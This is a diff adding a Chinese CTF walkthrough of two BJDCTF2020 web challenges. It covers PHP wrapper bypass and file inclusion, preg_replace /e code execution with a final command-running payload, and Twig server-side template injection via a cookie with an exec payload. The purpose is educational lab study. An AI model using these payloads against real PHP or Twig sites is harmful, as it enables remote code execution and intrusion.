@@ -115,6 +115,126 @@ Cookie: UM_distinctid=176eeefef524b1-06a7c2cac68426-3323765-144000-176eeefef5397
 Connection: close
 ```
 
+# [BJDCTF2020]ZJCTF，不过如此
+
+代码审计，从$text所指向的文件中读取字符串如果等于`I have a dream`则进入if语句，并且file参数当中不能包含flag，那么猜测flag就在flag.php了
+
+```
+<?php
+
+error_reporting(0);
+$text = $_GET["text"];
+$file = $_GET["file"];
+if(isset($text)&&(file_get_contents($text,'r')==="I have a dream")){
+    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
+    if(preg_match("/flag/",$file)){
+        die("Not now!");
+    }
+
+    include($file);  //next.php
+    
+}
+else{
+    highlight_file(__FILE__);
+}
+?>
+```
+
+第一处采用data伪协议绕过
+
+```
+data://text/palin,I have a dream
+也可以间写为
+data:text/palin,I have a dream
+当然也可以用base64编码绕过一些其他题目
+data://text/palin;base64,SSBoYXZlIGEgZHJlYW0=
+```
+
+之后根据hint，发现没有内容
+
+```
+http://url/?text=data://text/palin,I have a dream&file=next.php
+```
+
+hh，也是伪协议就行
+
+```
+http://url/?text=data://text/palin,I have a dream&file=php://filter/read=convert.base64-encode/resource=next.php
+```
+
+将获取到的内容base64解码，一看就知道是`preg_match`在`/e`模式下的任意代码执行
+
+```
+<?php
+$id = $_GET['id'];
+$_SESSION['id'] = $id;
+
+function complex($re, $str) {
+    return preg_replace(
+        '/(' . $re . ')/ei',
+        'strtolower("\\1")',
+        $str
+    );
+}
+
+
+foreach($_GET as $re => $str) {
+    echo complex($re, $str). "\n";
+}
+
+function getFlag(){
+	@eval($_GET['cmd']);
+}
+```
+
+官方payload`/?.*={${phpinfo()}}`
+即
+
+```
+<?php
+preg_replace('/(.*)/ei','strtolower("\\1")','{${phpinfo()}}');
+```
+
+但这里存在的问题是，GET方式传的字符串，`.`会被替换成`_`，这里采用`\S`匹配`非空白符`
+
+最终payload
+
+```
+http://e49c97cc-c1be-4f59-a134-899ba54d7def.node3.buuoj.cn/next.php?\S*=${getFlag()}&cmd=system('cat /flag');
+```
+
+# [BJDCTF2020]Cookie is so stable
+
+看标题就知道肯定要控制Cookie参数了，点进去发现和上面那道题一样，这里发现是SSTI
+
+```
+GET /flag.php HTTP/1.1
+Host: 158d1f46-6c3f-41db-9658-2b7f600cc4ca.node3.buuoj.cn
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://158d1f46-6c3f-41db-9658-2b7f600cc4ca.node3.buuoj.cn/flag.php
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: UM_distinctid=176eeefef524b1-06a7c2cac68426-3323765-144000-176eeefef5397e; PHPSESSID=3ee60c2faab39922d3ff170675090221; user={{6*6}}
+Connection: close
+```
+
+测试`{{7*'7'}}`输出了49，发现是Twig模板注入，如果结果为7777777则为jinja
+
+尝试很多payload以后发现下面这个可以
+
+```
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+```
+
+因此取得flag也很简单了
+
+```
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}
+```
+
 
 
 # 仓库地址
